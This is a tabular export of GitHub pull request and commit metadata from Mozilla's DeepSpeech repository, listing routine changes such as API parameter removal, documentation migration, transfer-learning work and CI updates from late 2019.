1806,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1007d93da26e6730f275a6100d005e049c59b722,Remove sample rate parameter usage from Java binding
1807,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11ad23cc1f298462d02c04dccad20a44be0b9d86,Remove sample rate parameter usage from .NET binding
1808,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,baaa5842b28aa14829739ece4f40f7c1b8e05635,Remove sample rate parameter usage from examples
1809,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,998daa5bcacb29e58dfdf672c8d6b71279f74ee2,Remove sample rate parameter usage from evaluate_tflite.py
1810,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9200b720c32e19767e31d5e2b918a5cf2b60d34f,Remove sample rate parameter usage from concurrent streams test
1811,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b68c560258d6b525aea41a850d917291e2f9748,"Sync all the docs with sample rate changes

X-DeepSpeech: NOBUILD"
1812,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2419,2419,Move default branch to current VERSION content instead of master,"Fixes #2418

X-DeepSpeech: NOBUILD",lissyx,1645737,2019-10-09T12:29:56Z,COLLABORATOR,True,6,11,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e7679593bae9af265ff28821e008a2b47c696d1,"Move default branch to current VERSION content instead of master

Fixes #2418

X-DeepSpeech: NOBUILD"
1813,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2417,2417,Use TFLite optimizations flag,Fixes #2415,lissyx,1645737,2019-10-09T10:22:27Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4f1f67f55de4ada1fb0254b6452336daa8fd3e4f,"Use TFLite optimizations flag

Fixes #2415"
1814,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2413,2413,Set sample_rate attribute of ds_audio_buffer in NO_SOX client (Fixes #2410),,reuben,477142,2019-10-09T07:39:05Z,MEMBER,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce785534fedf0352547e859f20319263bb28bdad,Set sample_rate attribute of ds_audio_buffer in NO_SOX client
1815,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2409,2409,Add ElectronJS v6.0,Fixes #2408,lissyx,1645737,2019-10-08T06:30:34Z,COLLABORATOR,True,188,110,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eab8bf5dece45d3fa503504ee4c367c854d60de2,"Add ElectronJS v6.0

Fixes #2408"
1816,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2407,2407,Fix bogus cross-file links,,lissyx,1645737,2019-10-08T04:47:24Z,COLLABORATOR,True,4,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3dae00b4ab835444ffdc17f84150ad7523423f39,Fix bogus cross-file links
1817,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2406,2406,Disable cache when data augmentation is set,Fixes #2396,lissyx,1645737,2019-10-08T04:44:33Z,COLLABORATOR,True,19,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c35068f8801476f11ed9d2221418d37a0341358e,"Disable cache when data augmentation is set

Fixes #2396"
1818,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2405,2405,[BREAKING] Set forget_bias=0 in CPU graph for compatibility with CudnnRNN,"In my tests this fixes the discrepancy between results with and without CudnnRNN. Tilman, can you verify this does the right thing for you too?",reuben,477142,2019-10-07T19:07:38Z,MEMBER,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a287a65e5a6db88f3b20de840edb23f92170499,Set forget_bias=0 in CPU graph for compatibility with CudnnRNN
1819,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2400,2400,Replace structs with IntPtr .NET,"We no longer need ModelState and StreamingState structs mapping to the managed side. 

While testing the change I've noticed a memory leak happens creating and destroying the model with LM enabled, without LM enabled works fine, with about 20 runs of creating and destroying the model the memory usage went from 200MB to 700MB, @lissyx @reuben any thoughts?

The same happened with the Structs so it's not related to this change, sending the PR. ",carlfm01,32177100,2019-10-05T04:21:18Z,COLLABORATOR,True,15,61,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,acabb26378d788c9108c9bf416bbef222b5a48e7,Move structs to IntPtr
1820,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2400,2400,Replace structs with IntPtr .NET,"We no longer need ModelState and StreamingState structs mapping to the managed side. 

While testing the change I've noticed a memory leak happens creating and destroying the model with LM enabled, without LM enabled works fine, with about 20 runs of creating and destroying the model the memory usage went from 200MB to 700MB, @lissyx @reuben any thoughts?

The same happened with the Structs so it's not related to this change, sending the PR. ",carlfm01,32177100,2019-10-05T04:21:18Z,COLLABORATOR,True,15,61,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f826f6324a67f3fff7293f99e01c9e7163726a5,Add thread-safe close
1821,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2399,2399,Re-work some long-form documentation,Fixes #2380,lissyx,1645737,2019-10-04T13:34:54Z,COLLABORATOR,False,15,113,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0ef615a3e196ce680fecf3a2d15d30fa7bef049,"Re-work some long-form documentation

Fixes #2380"
1822,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2395,2395,Move from Markdown to reStructuredText,,lissyx,1645737,2019-10-02T14:44:07Z,COLLABORATOR,True,1942,1028,37,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9ce8c24165e57024209b27287dab09796190af79,Move from Markdown to reStructuredText
1823,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2395,2395,Move from Markdown to reStructuredText,,lissyx,1645737,2019-10-02T14:44:07Z,COLLABORATOR,True,1942,1028,37,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1936c60b3adf4d9003dff5e96d833e25eada8cc,"Refer to examples from doc

Fixes #2338"
1824,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2395,2395,Move from Markdown to reStructuredText,,lissyx,1645737,2019-10-02T14:44:07Z,COLLABORATOR,True,1942,1028,37,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,65c942efbbb285e300677586bdb0168373316c9e,Update cardboardlint configuration
1825,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2394,2394,Importers slr mailabs,,lissyx,1645737,2019-10-02T10:37:30Z,COLLABORATOR,True,423,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e22f9787be988c234d49f75af37f7654c6667b79,Add SLR57 importer: African Accented French
1826,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2394,2394,Importers slr mailabs,,lissyx,1645737,2019-10-02T10:37:30Z,COLLABORATOR,True,423,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0ac4df6f828be9b101d19b739bb4a56a414d4ddb,Add M-AILABS importer
1827,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2393,2393,Update README.md,Clearer information around disabling cache when using augmentation,rhamnett,6739670,2019-10-01T19:27:29Z,CONTRIBUTOR,False,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92c0de2e282453c88726d8b0bac3607a098068cd,"Update README.md

Clearer information around disabling cache when using augmentation"
1828,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2392,2392,Improve macOS tc-workdir cleanup,,lissyx,1645737,2019-09-30T13:27:55Z,COLLABORATOR,True,4,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0969b4f9b9056652667aaf963a1347405d2c605f,Improve macOS tc-workdir cleanup
1829,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2391,2391,Make language model scoring optional in Python inference code,,reuben,477142,2019-09-30T09:43:23Z,MEMBER,True,12,14,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4302a5f7677d583d98d2119c8e3068d30cff3406,Make language model scoring optional in Python inference code
1830,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2387,2387,Bump VERSION to 0.6.0-alpha.8,,lissyx,1645737,2019-09-27T09:10:54Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8595f2a7bbef798bf901a1bc538a7d1a25efbbc1,Bump VERSION to 0.6.0-alpha.8
1831,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2386,2386,Fixing typo s/StreamingContext/StreamingState/,X-DeepSpeech: NOBUILD,JRMeyer,8389864,2019-09-26T19:08:39Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fed5039cc72a1ba60a03da3a4642c7a3c7d09ace,"Fixing typo s/StreamingContext/StreamingState/

X-DeepSpeech: NOBUILD"
1832,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2385,2385,Load KenLM with LAZY,Fixes #2384,lissyx,1645737,2019-09-26T16:22:45Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,86b44a7cb7638cae0b4512e94ae1337ac3244580,"Load KenLM with LAZY

Fixes #2384"
1833,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2383,2383,"Don't explicitly score the BOS token, and avoid copies when scoring sentences",,reuben,477142,2019-09-26T12:09:42Z,MEMBER,True,86,43,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6dba6d4a954f20155bc06bdec6453307aa54feef,"Don't explicitly score the BOS token, and avoid copies when scoring sentences"
1834,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2383,2383,"Don't explicitly score the BOS token, and avoid copies when scoring sentences",,reuben,477142,2019-09-26T12:09:42Z,MEMBER,True,86,43,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a32397352125d50abf69566b6515db3f40339612,Address review comments
1835,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,158f461381f3ecc699af19cdcade84917d340642,Merge branch 'master' into transfer-learning2
1836,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,81994cf514a92c760495a1cb7fe48be6ad773c13,"clean up .compute for github

X-DeepSpeech: NOBUILD"
1837,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb88747fe6d8ea536f17720ff5dd753b61f82d97,"Merge branch 'master' into transfer-learning2

X-DeepSpeech: NOBUILD"
1838,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e569b31b466a2256c4081a360ffb2804e9402b06,update .compute for 0.5.1 release
1839,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7174245441f9dd75e6bc5b824bc417fa271c06a8,"Merge pull request #2191 from ftyers/patch-1

update .compute for 0.5.1 release"
1840,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d10eec38278edf8dd8dab252df510782cf4b7247,Allow continuing transfer learning
1841,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,153ac0902de93c73cd16c9d7f9415e6b3c206998,"Merge pull request #2299 from Jendker/my-transfer-learning2

Allow continuing transfer learning"
1842,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,219d9ffd3c78ccb24cdb551b0ce25a42dc8525e0,merging onto master
1843,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,18cbde4db41aeac064a46fd1a338d42065b705d5,verified that current setup works
1844,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2cdea787d8f788b6cdee8de19b913719ac72e80,checkout .compute from master
1845,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3240bffbc87ad51417f50e7f64d91fb9b6bcad1,Update evaluate_tflite with wav_filename
1846,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27efcf470a44a3e6af781433b064ac33dcf1d9ef,swap taskcluster.net references for community-tc.services.mozilla.com
1847,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3501ce15c2ef04032dea29da9ca7fd746c47968f,update taskcluster.yml for community-tc
1848,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd12eacafa7f92acb2b5bf5d6af9d26f047cb045,include /api/ in community-tc URLs
1849,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c86eca944f36657c5116b8c2da362b8544d5a8e8,remove unnecessary lowest-priority scope
1850,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e17549dcb45440a8e76b662c52b3d6797e6712ac,merged from mozilla's master
1851,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,168e2be90aa1eef9673719808100c8a809b61074,"making flags clearer for transfer learning / reverting 'auto' to default initialization scheme

X-DeepSpeech: NOBUILD"
1852,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,95c4bedaeab6ab45470f1910ede181ab0f62efa8,"added taskcluster test for transfer learning. the test takes the checkpoint of a toy model trained from a single LDC clip and adapts that model to a Russian clip.

This test WILL NOT WORK in current form. A sample dir (analog to ldc sample) must be hosted somewhere and downloaded. This should be simple. I suggest taking a single russian clip from common voice.

X-DEEPSPEECH: NO BUILD"
1853,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6929fee2d3ebf7c07e29ca6d026bdb60ae43d443,"Merge pull request #2482 from lissyx/fix-eval-tflite

Update evalutate_tflite with wav_filename"
1854,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,489dbad3a43393451c5051dc60a4e049969a339a,Check unicode normalization
1855,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1da680ae9ac85e5ee5ed36b077e25e337a0aaf8,"Merge pull request #2483 from lissyx/alphabet-consistency

Check unicode normalization"
1856,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8cbcf1da3c62f7c578e965f244731a58072e16db,Update JS doc for changed API
1857,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8235dd2a4ee8262733dedf667d3a41bc730fcd11,"Merge pull request #2492 from lissyx/fix-js-doc

Update JS doc for changed API"
1858,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1089b59e72d9e58386aa4ccf70d4405719e1631a,"Merge pull request #2486 from djmitche/bug1574659

Bug 1574659 - migrate from taskcluster.net to community-tc"
1859,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c898d92cb9ef6b4f2de5349b9af6d58bb3b867a,Move to TC Community
1860,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1e400760b2023b20abc19c885b7834db8b1b5321,"Merge pull request #2491 from lissyx/tc-community

Move to TC Community"
1861,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e1be01b1d6826383aa27ab500ad7b4b244e6a108,Bump VERSION to 0.6.0-alpha.12
1862,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,493aaed151e654fdc0daf3ede92b92a25c25a8d0,"Merge pull request #2493 from lissyx/bump-v0.6.0-alpha.12

Bump VERSION to 0.6.0-alpha.12"
1863,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c820817794d445746aefb1b5347b35bf5e0c621,Embed alphabet directly in model
1864,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2382,2382,Transfer Learning,"This PR represents an up-to-date version of `transfer-learning2`, which I've tested locally on Common Voice for a small (i.e. 100 utterances) adaptation set",JRMeyer,8389864,2019-09-25T00:28:26Z,CONTRIBUTOR,False,3608,5253,398,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3fdc7d422d96b209373fa00076a5d09084a0717e,Remove alphabet param usage
1865,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2381,2381,Put back ReadTheDocs badge,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-09-24T16:27:53Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a8d3957291d08957911ad4a702dd7ff0fb60470,"Put back ReadTheDocs badge

X-DeepSpeech: NOBUILD"
